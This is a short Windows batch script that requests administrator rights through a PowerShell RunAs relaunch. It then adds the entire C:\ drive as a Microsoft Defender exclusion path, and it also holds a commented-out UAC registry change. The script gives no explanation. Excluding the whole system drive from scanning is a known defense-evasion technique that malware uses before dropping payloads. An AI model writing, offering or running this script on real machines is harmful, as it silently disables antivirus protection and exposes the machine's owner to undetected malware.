@echo off
setlocal

REM Check if the script is running with administrative privileges
NET SESSION >NUL 2>&1
IF %ERRORLEVEL% EQU 0 (
    REM Script is running with administrative privileges
    goto :continue
) ELSE (
    REM Prompt for administrative privileges and re-run the script with PowerShell
    echo Requesting administrative privileges...
    powershell -Command "Start-Process -Verb RunAs -FilePath '%~f0'"
    exit /b
)

:continue
REM powershell -Command "Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 1"
powershell -Command "Add-MpPreference -ExclusionPath 'C:\' -Force"
pause 